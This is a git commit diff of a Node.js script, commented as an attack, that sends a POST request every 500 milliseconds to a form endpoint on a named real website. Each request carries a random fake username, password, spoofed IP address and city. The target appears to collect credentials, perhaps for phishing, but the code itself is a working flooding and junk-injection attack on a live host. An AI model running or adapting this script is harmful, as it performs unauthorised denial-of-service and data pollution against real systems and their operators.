f01362514d4dd9ca281db4ede08a63f832347de6
zhouhuafei <zhouhuafei@shopex.cn>
2018-01-29 17:33:56 +0800

    app.js

--- app.js
+++ app.js
@@ -1,30 +1,35 @@
+// express
 const express = require('express');
+// axios
 const axios = require('axios');
-
+// app
 const app = express();
-
-function getRandom() {
-    return Math.round(Math.random() * 9999999999);
-}
-
-const address = ['北京市', '天津市', '辽宁省沈阳市', '吉林省长春市', '黑龙江省哈尔滨市', '上海市', '江苏省南京市', '湖北省武汉市', '广东省广州市', '重庆市', '四川省成都市', '陕西省西安市'];
-const addressLen = address.length;
-
+// 地址
+const addressArr = ['北京市', '天津市', '辽宁省沈阳市', '吉林省长春市', '黑龙江省哈尔滨市', '上海市', '江苏省南京市', '湖北省武汉市', '广东省广州市', '重庆市', '四川省成都市', '陕西省西安市'];
+const addressLen = addressArr.length;
+const address = addressArr[Math.round(Math.random() * (addressLen - 1))];
+// ip
+const ip = `${Math.round(Math.random() * 999)}.${Math.round(Math.random() * 999)}.${Math.round(Math.random() * 999)}.${Math.round(Math.random() * 999)}`;
+// 用户名
+const username = Math.round(Math.random() * 9999999999);
+// 密码
+const password = Math.round(Math.random() * 9999999999);
+// 进攻
 setInterval(function () {
     axios({
         url: 'http://www.dnf-me.cn/in.asp?action=add',
         method: 'post',
         data: {
-            ipku: address[Math.round(Math.random() * (addressLen - 1))],
             dede_fields: 'u,text;p,text',
             dede_fieldshash: ['d1WEGXsPu8CFufla1kRw8W8kW3QA2TG'.split('').sort(() => Math.random() - 0.5).join(''), 'd1WEGXsPu8CFufla1kRw8W8kW3QA2TG'][Math.round(Math.random())],
-            ip: `${Math.round(Math.random() * 999)}.${Math.round(Math.random() * 999)}.${Math.round(Math.random() * 999)}.${Math.round(Math.random() * 999)}`,
-            j_dh: getRandom(),
-            j_xm: getRandom(),
+            ipku: address,
+            ip: ip,
+            j_dh: username,
+            j_xm: password,
         },
     }).then(function (json) {
         console.log(json);
     });
 }, 500);
-
+// 监听进程
 app.listen('6661');
